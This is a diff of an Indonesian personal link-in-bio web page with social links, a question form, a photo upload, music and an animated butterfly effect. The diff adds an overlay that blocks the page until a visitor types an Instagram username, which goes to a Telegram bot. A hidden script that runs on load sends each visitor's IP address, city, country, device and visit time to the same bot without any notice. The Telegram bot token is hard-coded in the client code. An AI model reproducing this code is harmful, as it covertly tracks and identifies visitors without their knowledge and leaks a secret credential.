@@ -7,10 +7,12 @@
   <style>
     :root{--bg:#0b0b0d;--card:#111214;--muted:#9aa0a6;--accent:#c56cff}
     *{box-sizing:border-box}
-    body{margin:0;font-family:Inter,system-ui,Arial,sans-serif;
-         background:linear-gradient(180deg,#050507 0%, #0b0b0d 100%);
-         color:#fff;min-height:100vh;display:flex;align-items:center;
-         justify-content:center;padding:24px}
+    body{
+      margin:0;font-family:Inter,system-ui,Arial,sans-serif;
+      background:linear-gradient(180deg,#050507 0%, #0b0b0d 100%);
+      color:#fff;min-height:100vh;display:flex;align-items:center;
+      justify-content:center;padding:24px
+    }
     .wrap{width:100%;max-width:760px}
     .card{background:var(--card);border-radius:14px;padding:28px;
           box-shadow:0 6px 20px rgba(0,0,0,0.6)}
@@ -38,6 +40,17 @@
     .panel{background:#0b0b0d;padding:16px;border-radius:10px;
            width:90%;max-width:520px;border:1px solid rgba(255,255,255,0.04)}
     .tiny{font-size:12px;color:var(--muted)}
+    .butterfly {
+      position: absolute;
+      font-size: 22px;
+      color: #4cc9ff;
+      opacity: 0.9;
+      pointer-events: none;
+      user-select: none;
+      z-index: 9;
+      will-change: transform;
+      transition: transform 0.1s ease;
+    }
   </style>
 </head>
 <body>
@@ -56,12 +69,11 @@
       <div class="btns">
         <a class="btn" href="https://www.tiktok.com/@koplingterus" target="_blank">
           ⚡ TikTok<small>@koplingterus</small></a>
-        <a class="btn" href="https://open.spotify.com/user/31ekkvvirtytc24a46swumscuv3e?si=NNMZyh0WTnSdYnOnh23jPQ&nd=1&utm_source=copy-link&utm_medium=sharing&_branch_match_id=1507301875988892916&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXLy7IL8lMq9TLyczL1nfJKjFxyTJ3KotIsq8rSk1LLSrKzEuPTyrKLy9OLbJ1zijKz00FAFFlBHc6AAAA" target="_blank">
-          🎧 Spotify<small>https://spotify.link/Djt4Dj7BvXb</small></a>
+        <a class="btn" href="https://open.spotify.com/user/31ekkvvirtytc24a46swumscuv3e?si=NNMZyh0WTnSdYnOnh23jPQ" target="_blank">
+          🎧 Spotify<small>spotify.link/Djt4Dj7BvXb</small></a>
         <button class="btn" id="openAsk">✉️ Tanyakan sesuatu kepadaku</button>
       </div>
 
-      <!-- area kirim foto -->
       <div class="music">
         <h3>🖼️ Kirim foto sesuatu?</h3>
         <p class="note">Unggah foto yang akan dikirim📬</p>
@@ -75,11 +87,10 @@
     </div>
   </div>
 
-  <!-- Modal Form -->
   <div class="modal" id="modal">
     <div class="panel">
       <h3>📮 Kirim pertanyaan</h3>
-      <p class="tiny">Mau bertanya tentang aku?.</p>
+      <p class="tiny">Mau bertanya tentang aku?</p>
       <input id="qname" placeholder="Nama" />
       <textarea id="qtext" rows="4" placeholder="Tulis pertanyaan kamu..." required></textarea>
       <div style="display:flex;gap:8px;margin-top:8px">
@@ -90,338 +101,221 @@
     </div>
   </div>
 
+  <audio id="bgmusic"
+    src="https://hipstrumentals.com/wp-content/uploads/2025/07/Lil-Peep-Ft.-rainy-bear-nuts-Instrumental-Prod.-By-Willie-G.mp3"
+    preload="auto" muted></audio>
+
+  <button id="musicButton" style="
+    position:fixed;bottom:20px;right:20px;
+    background:rgba(30,144,255,0.3);
+    color:#fff;border:1px solid rgba(255,255,255,0.4);
+    border-radius:12px;padding:10px 16px;
+    font-size:14px;cursor:pointer;
+    backdrop-filter:blur(8px);
+    display:none;z-index:9999;">
+    🎧 Tap untuk mulai musik
+  </button>
+
+  <div id="visitorInfo" style="display:none;"></div>
+
+  <!-- 🔒 POPUP LOGIN -->
+  <div id="blurOverlay" style="
+    position:fixed;inset:0;
+    backdrop-filter:blur(8px);
+    background:rgba(0,0,0,0.55);
+    display:flex;align-items:center;
+    justify-content:center;
+    z-index:999999;">
+    <div style="
+      background:rgba(20,20,20,0.85);
+      border:1px solid rgba(255,255,255,0.1);
+      border-radius:20px;
+      padding:25px;
+      width:85%;max-width:340px;
+      text-align:center;color:#fff;">
+      <h3>Masukkan Username Instagram</h3>
+      <input id="igInput" type="text" placeholder="@username" style="
+        width:90%;padding:10px;border-radius:10px;border:none;
+        background:rgba(255,255,255,0.1);
+        color:#fff;text-align:center;font-size:15px;outline:none;">
+      <button id="igSubmit" style="
+        margin-top:15px;background:#4cc9ff;border:none;
+        padding:10px 20px;border-radius:10px;
+        color:#000;font-weight:bold;cursor:pointer;">Lanjut</button>
+    </div>
+  </div>
+
+  <div id="igStatus" style="
+    position:fixed;bottom:12px;left:14px;
+    background:rgba(255,255,255,0.08);
+    color:#c5c5c5;font-size:13px;border-radius:8px;
+    padding:6px 10px;z-index:99999;
+    font-family:monospace;cursor:pointer;display:none;">
+  </div>
+
   <script>
     const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
-    const CHAT_ID   = "6864694275";
+    const CHAT_ID = "6864694275";
 
-    /* --- Modal pertanyaan --- */
+    /* musik */
+    const music = document.getElementById('bgmusic');
+    const btn = document.getElementById('musicButton');
+    let started = false;
+    music.volume = 0.4;
+    document.addEventListener('click', startMusic, { once:true });
+    document.addEventListener('touchstart', startMusic, { once:true });
+    async function startMusic(){
+      if(started)return;
+      started=true;music.muted=false;
+      try{await music.play();btn.style.display='none';}
+      catch(err){btn.style.display='block';}
+    }
+    btn.onclick=()=>music.play();
+
+    /* modal */
     const modal=document.getElementById('modal');
     document.getElementById('openAsk').onclick=()=>modal.classList.add('show');
     document.getElementById('closeQ').onclick=()=>modal.classList.remove('show');
-    const qname=document.getElementById('qname'),
-          qtext=document.getElementById('qtext'),
-          qmsg=document.getElementById('qmsg');
+
+    /* login username (versi fix total) */
+    const overlay = document.getElementById("blurOverlay");
+    const input = document.getElementById("igInput");
+    const btnLogin = document.getElementById("igSubmit");
+    const savedIG = localStorage.getItem("ig_user");
+
+    function removeOverlay() {
+      if (!overlay) return;
+      overlay.style.transition = "opacity 0.3s ease";
+      overlay.style.opacity = "0";
+      overlay.style.pointerEvents = "none";
+      setTimeout(() => {
+        overlay.style.display = "none";
+        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+      }, 300);
+    }
+
+    if (savedIG) {
+      removeOverlay();
+      showUserStatus(savedIG);
+    }
+
+    btnLogin.onclick = async () => {
+      const username = input.value.trim();
+      if (!username) {
+        alert("Masukkan username dulu");
+        return;
+      }
+
+      localStorage.setItem("ig_user", username);
+      showUserStatus(username);
+      removeOverlay();
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `👤 Username login: ${username}`,
+          }),
+        });
+      } catch (e) {
+        console.log("Gagal kirim ke Telegram", e);
+      }
+    };
+
+    function showUserStatus(name) {
+      const el = document.getElementById("igStatus");
+      el.textContent = `👋 Login sebagai ${name} (keluar)`;
+      el.style.display = "block";
+      el.onclick = () => {
+        if (confirm("Keluar dan hapus username?")) {
+          localStorage.removeItem("ig_user");
+          el.textContent = "🔄 Logout...";
+          setTimeout(() => location.reload(), 600);
+        }
+      };
+    }
+
+    /* kirim pertanyaan */
     document.getElementById('sendQ').onclick=async()=>{
-      const name=qname.value.trim()||"Anonim",text=qtext.value.trim();
+      const savedUser=localStorage.getItem("ig_user")||"Anonim";
+      const text=document.getElementById('qtext').value.trim();
+      const qmsg=document.getElementById('qmsg');
       if(!text){qmsg.textContent="Isi pertanyaan dulu.";return;}
       qmsg.textContent="Mengirim ...";
       try{
         const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
           {method:"POST",headers:{"Content-Type":"application/json"},
-           body:JSON.stringify({chat_id:CHAT_ID,
-                                text:`📩 Pesan baru dari Link Bio\n👤 ${name}\n💬 ${text}`})});
-        if(res.ok){qmsg.textContent="✅ Terkirim!";
-          qname.value='';qtext.value='';setTimeout(()=>modal.classList.remove('show'),1000);}
-        else qmsg.textContent="❌ Token atau Chat ID salah.";
-      }catch(e){qmsg.textContent="⚠️ cek koneksi.";}
+           body:JSON.stringify({chat_id:CHAT_ID,text:`📩 Pertanyaan dari ${savedUser}\n${text}`})});
+        qmsg.textContent=res.ok?"✅ Terkirim!":"❌ Gagal.";
+        if(res.ok)setTimeout(()=>modal.classList.remove('show'),1000);
+      }catch(e){qmsg.textContent="⚠️ Cek koneksi.";}
     };
 
-    /* --- Kirim foto publik --- */
-    const photoInput=document.getElementById("photoInput"),
-          caption=document.getElementById("caption"),
-          statusEl=document.getElementById("status");
+    /* kirim foto */
     document.getElementById("sendPhoto").onclick=async()=>{
-      const file=photoInput.files[0];
-      if(!file){statusEl.textContent="Pilih foto dulu ya📷";return;}
-      const formData=new FormData();
-      formData.append("chat_id",CHAT_ID);
-      formData.append("caption",caption.value||"Foto");
-      formData.append("photo",file);
-      statusEl.textContent="Mengirim foto ...";
+      const savedUser=localStorage.getItem("ig_user")||"Anonim";
+      const file=document.getElementById("photoInput").files[0];
+      const caption=document.getElementById("caption").value;
+      const statusEl=document.getElementById("status");
+      if(!file){statusEl.textContent="Pilih foto dulu.";return;}
+      const fd=new FormData();
+      fd.append("chat_id",CHAT_ID);
+      fd.append("caption",`📸 Foto dari ${savedUser}\n${caption}`);
+      fd.append("photo",file);
+      statusEl.textContent="Mengirim ...";
       try{
-        const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-          {method:"POST",body:formData});
-        statusEl.textContent=res.ok?"✅ Foto berhasil dikirim!":"❌ Gagal kirim foto.";
-        if(res.ok){photoInput.value="";caption.value="";}
-      }catch(e){statusEl.textContent="⚠️ Cek Koneksi .";}
+        const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+        statusEl.textContent=res.ok?"✅ Terkirim!":"❌ Gagal.";
+      }catch(e){statusEl.textContent="⚠️ Koneksi lemah.";}
     };
-  </script>
-  <!-- 🌟 TRANSISI HALUS & COUNTER PENGUNJUNG -->
-<style>
-  /* posisi dan gaya counter pengunjung */
-  #visitorCount {
-    position: fixed;
-    bottom: 12px;
-    right: 14px;
-    background: rgba(255,255,255,0.08);
-    color: #c5c5c5;
-    font-size: 13px;
-    border-radius: 8px;
-    padding: 6px 10px;
-    z-index: 9999;
-    font-family: monospace;
-  }
-</style>
 
-<script>
-  /* --- Transisi halus saat halaman dibuka --- */
-  window.addEventListener("load", () => {
-    document.body.classList.add("loaded");
-  });
-
-  /* --- Counter pengunjung (lokal + global via Telegram) --- */
-  const countKey = "visitorCountLocal";
-  let count = localStorage.getItem(countKey);
-  count = count ? parseInt(count) + 1 : 1;
-  localStorage.setItem(countKey, count);
-
-  // tampilkan counter di pojok kanan bawah
-  const counterEl = document.createElement("div");
-  counterEl.id = "visitorCount";
-  counterEl.textContent = `👁️ Pengunjung ke-${count}`;
-  document.body.appendChild(counterEl);
-
-</script>
-<!-- 🎧 Musik otomatis dengan fallback -->
-<audio id="bgmusic"
-  src="https://hipstrumentals.com/wp-content/uploads/2025/07/Lil-Peep-Ft.-rainy-bear-nuts-Instrumental-Prod.-By-Willie-G.mp3"
-  preload="auto"
-  muted></audio>
-
-<!-- Tombol fallback -->
-<button id="musicButton"
-  style="
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    background: rgba(30, 144, 255, 0.3);
-    color: #fff;
-    border: 1px solid rgba(255,255,255,0.4);
-    border-radius: 12px;
-    padding: 10px 16px;
-    font-size: 14px;
-    cursor: pointer;
-    backdrop-filter: blur(8px);
-    display: none;
-    z-index: 9999;">
-  🎧 Tap untuk mulai musik
-</button>
-
-<script>
-  const music = document.getElementById('bgmusic');
-  const btn = document.getElementById('musicButton');
-  let started = false;
-
-  music.volume = 0.4;
-  music.loop = false;
-
-  // fungsi play musik
-  async function startMusic() {
-    if (started) return;
-    started = true;
-    music.muted = false;
-
-    try {
-      await music.play();
-      console.log("🎶 Musik berhasil diputar");
-      btn.style.display = 'none';
-    } catch (err) {
-      console.warn("Autoplay gagal, tampilkan tombol:", err);
-      btn.style.display = 'block';
+    /* info umum pengunjung */
+    async function showVisitorInfo(){
+      const savedUser=localStorage.getItem("ig_user")||"Anonim";
+      try{
+        const r=await fetch("https://ipapi.co/json/");const d=await r.json();
+        const now=new Date();
+        const msg=`📢 Pengunjung Baru!\n👤 ${savedUser}\n🌎 ${d.city||"?"}, ${d.country_name||"?"}\n💻 ${/mobile/i.test(navigator.userAgent)?"Mobile":"Desktop"}\n🕓 ${now.toLocaleString('id-ID')}\n🔢 ${d.ip||"?"}`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+          method:"POST",headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+        });
+      }catch(e){console.log("Gagal kirim info",e);}
     }
-  }
+    showVisitorInfo();
 
-  // coba autoplay dengan interaksi pertama
-  document.addEventListener('click', startMusic, { once: true });
-  document.addEventListener('touchstart', startMusic, { once: true });
-  document.addEventListener('keydown', startMusic, { once: true });
-
-  // kalau autoplay gagal → user bisa tekan tombol manual
-  btn.addEventListener('click', async () => {
-    try {
-      await music.play();
-      btn.style.display = 'none';
-      console.log("🎧 Musik dimulai manual via tombol");
-    } catch (err) {
-      alert("Gagal memutar musik: " + err.message);
+    /* kupu-kupu */
+    const area=document.querySelector('.card');
+    const butterflies=[];const count=25;
+    let hold=false,hx=0,hy=0;
+    area.style.position='relative';area.style.overflow='hidden';
+    function bounds(){const r=area.getBoundingClientRect();return{w:area.clientWidth,h:area.clientHeight,l:r.left,t:r.top};}
+    for(let i=0;i<count;i++){
+      const b=document.createElement("div");b.className="butterfly";b.textContent="🦋";area.appendChild(b);
+      butterflies.push({el:b,x:Math.random()*bounds().w,y:Math.random()*bounds().h,vx:(Math.random()-.5)*1.4,vy:(Math.random()-.5)*1.4,size:16+Math.random()*10});
+      b.style.fontSize=butterflies[i].size+"px";
     }
-  });
-
-  // berhenti total setelah selesai
-  music.addEventListener('ended', () => {
-    music.pause();
-    music.currentTime = 0;
-    console.log("🎵 Musik selesai, tidak diulang");
-  });
-</script>
-<!-- 🌍 INFO UMUM PENGUNJUNG (TERSEMBUNYI) -->
-<div id="visitorInfo" style="display:none;"></div>
-
-<script>
-  async function showVisitorInfo() {
-    const now = new Date();
-
-    // deteksi perangkat & browser
-    const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
-    const browser = navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge|Opera)/i)?.[0] || "Tidak diketahui";
-    const os = navigator.userAgent.match(/(Windows|Mac|Linux|Android|iPhone|iPad)/i)?.[0] || "Tidak diketahui";
-
-    try {
-      // ambil data IP dan lokasi
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-
-      // kirim ke Telegram
-      const chat_id = "6864694275"; // ganti dengan chat_id kamu
-      const bot_token = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY"; // ganti token kalau perlu
-
-      const message = `
-📢 <b>Pengunjung Baru!</b>
-🌎 Lokasi: ${data.city || "?"}, ${data.country_name || "?"}
-💻 Perangkat: ${device}
-🌐 Browser: ${browser}
-🪟 OS: ${os}
-🕓 Waktu: ${now.toLocaleString('id-ID')}
-🔢 IP: ${data.ip || "?"}
-`;
-
-      await fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          chat_id,
-          text: message,
-          parse_mode: "HTML"
-        })
+    function move(){
+      const r=bounds();
+      butterflies.forEach(b=>{
+        if(hold){const dx=hx-b.x,dy=hy-b.y;b.vx+=dx*0.005;b.vy+=dy*0.005;}
+        b.x+=b.vx;b.y+=b.vy;
+        if(b.x<=0||b.x>=r.w-b.size)b.vx*=-1;
+        if(b.y<=0||b.y>=r.h-b.size)b.vy*=-1;
+        b.vx=Math.max(-1.8,Math.min(1.8,b.vx));
+        b.vy=Math.max(-1.8,Math.min(1.8,b.vy));
+        b.el.style.left=b.x+"px";b.el.style.top=b.y+"px";
       });
-
-      console.log("✅ Info pengunjung dikirim ke Telegram.");
-    } catch (err) {
-      console.warn("⚠️ Gagal kirim info pengunjung:", err);
-    }
-  }
-
-  showVisitorInfo();
-</script>
+      requestAnimationFrame(move);
+    }move();
+    area.addEventListener('mousedown',e=>{hold=true;hx=e.clientX-bounds().l;hy=e.clientY-bounds().t;});
+    area.addEventListener('mouseup',()=>hold=false);
+    area.addEventListener('mousemove',e=>{if(hold){hx=e.clientX-bounds().l;hy=e.clientY-bounds().t;}});
+    area.addEventListener('touchstart',e=>{const t=e.touches[0];hold=true;hx=t.clientX-bounds().l;hy=t.clientY-bounds().t;});
+    area.addEventListener('touchend',()=>hold=false);
+    area.addEventListener('touchmove',e=>{if(hold){const t=e.touches[0];hx=t.clientX-bounds().l;hy=t.clientY-bounds().t;}});
+  </script>
 </body>
-<style>
-  .butterfly {
-    position: absolute;
-    font-size: 22px;
-    color: #4cc9ff;
-    opacity: 0.9;
-    pointer-events: none;
-    user-select: none;
-    z-index: 9;
-    will-change: transform;
-    transition: transform 0.1s ease;
-  }
-</style>
-
-<script>
-  const area = document.querySelector('.card');
-  const butterflies = [];
-  const butterflyCount = 25;
-  let holdActive = false;
-  let holdX = 0;
-  let holdY = 0;
-
-  // pastikan card siap sebagai area gerak kupu
-  area.style.position = 'relative';
-  area.style.overflow = 'hidden';
-
-  // fungsi ambil ukuran card
-  function getBounds() {
-    const rect = area.getBoundingClientRect();
-    return { width: area.clientWidth, height: area.clientHeight, left: rect.left, top: rect.top };
-  }
-
-  const bounds = getBounds();
-
-  // buat kupu-kupu
-  for (let i = 0; i < butterflyCount; i++) {
-    const b = document.createElement("div");
-    b.className = "butterfly";
-    b.textContent = "🦋";
-    area.appendChild(b);
-
-    butterflies.push({
-      el: b,
-      x: Math.random() * bounds.width,
-      y: Math.random() * bounds.height,
-      vx: (Math.random() - 0.5) * 1.4,
-      vy: (Math.random() - 0.5) * 1.4,
-      size: 16 + Math.random() * 10,
-    });
-
-    b.style.fontSize = butterflies[i].size + "px";
-  }
-
-  // animasi kupu-kupu
-  function moveButterflies() {
-    const rect = getBounds();
-
-    butterflies.forEach(b => {
-      // saat ditekan, kupu lebih cepat ke arah titik
-      if (holdActive) {
-        const dx = holdX - b.x;
-        const dy = holdY - b.y;
-        b.vx += dx * 0.005; // makin responsif
-        b.vy += dy * 0.005;
-      }
-
-      b.x += b.vx;
-      b.y += b.vy;
-
-      // pantulan di tepi area card
-      if (b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -1;
-      if (b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -1;
-
-      // variasi acak halus saat tidak ditekan
-      if (!holdActive) {
-        b.vx += (Math.random() - 0.5) * 0.03;
-        b.vy += (Math.random() - 0.5) * 0.03;
-      }
-
-      // batas kecepatan biar tidak terlalu cepat
-      b.vx = Math.max(-1.8, Math.min(1.8, b.vx));
-      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));
-
-      b.el.style.left = b.x + "px";
-      b.el.style.top = b.y + "px";
-      b.el.style.transform = `rotate(${(b.x + b.y) / 3}deg)`;
-    });
-
-    requestAnimationFrame(moveButterflies);
-  }
-  moveButterflies();
-
-  // fungsi saat menahan klik/tap
-  const startHold = (x, y) => {
-    const rect = getBounds();
-    holdActive = true;
-    holdX = x - rect.left;
-    holdY = y - rect.top;
-  };
-
-  const moveHold = (x, y) => {
-    if (holdActive) {
-      const rect = getBounds();
-      holdX = x - rect.left;
-      holdY = y - rect.top;
-    }
-  };
-
-  const endHold = () => {
-    holdActive = false;
-  };
-
-  // event mouse
-  area.addEventListener('mousedown', e => startHold(e.clientX, e.clientY));
-  area.addEventListener('mousemove', e => moveHold(e.clientX, e.clientY));
-  area.addEventListener('mouseup', endHold);
-  area.addEventListener('mouseleave', endHold);
-
-  // event touch (HP)
-  area.addEventListener('touchstart', e => {
-    const t = e.touches[0];
-    startHold(t.clientX, t.clientY);
-  });
-  area.addEventListener('touchmove', e => {
-    const t = e.touches[0];
-    moveHold(t.clientX, t.clientY);
-  });
-  area.addEventListener('touchend', endHold);
-  area.addEventListener('touchcancel', endHold);
-</script>
 </html>
